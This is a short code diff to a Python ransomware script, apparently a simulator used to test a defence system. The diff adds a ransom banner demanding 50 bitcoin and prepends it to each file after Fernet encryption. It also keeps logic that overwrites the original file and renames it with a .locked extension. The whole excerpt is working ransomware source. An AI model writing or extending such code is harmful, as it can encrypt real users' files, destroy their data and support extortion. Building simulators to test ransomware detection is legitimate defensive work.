@@ -20,6 +20,17 @@ To recover your data, you must pay the ransom immediately.
 Do not attempt to modify the .locked files or they will be permanently corrupted.
 """
 
+RANSOM_BANNER = b"""!!! YOUR FILES HAVE BEEN ENCRYPTED BY CANARY RANSOMWARE !!!
+
+Your documents, photos, databases, and other important files have been encrypted
+with the strongest military-grade encryption algorithm.
+
+To recover your data, you must pay 50 BITCOIN immediately.
+If you attempt to tamper with this file, the key will be destroyed forever.
+
+-----BEGIN ENCRYPTED DATA-----
+"""
+
 
 def handle_sigterm(sig, frame):
     print("\n[RANSOMWARE] Process terminated by defence system.")
@@ -66,7 +77,7 @@ def encrypt_file(filepath, fernet):
         encrypted_data = fernet.encrypt(original_data)
 
         with open(filepath, "wb") as f:
-            f.write(encrypted_data)
+            f.write(RANSOM_BANNER + encrypted_data)
 
         locked_path = filepath + ".locked"
         os.rename(filepath, locked_path)
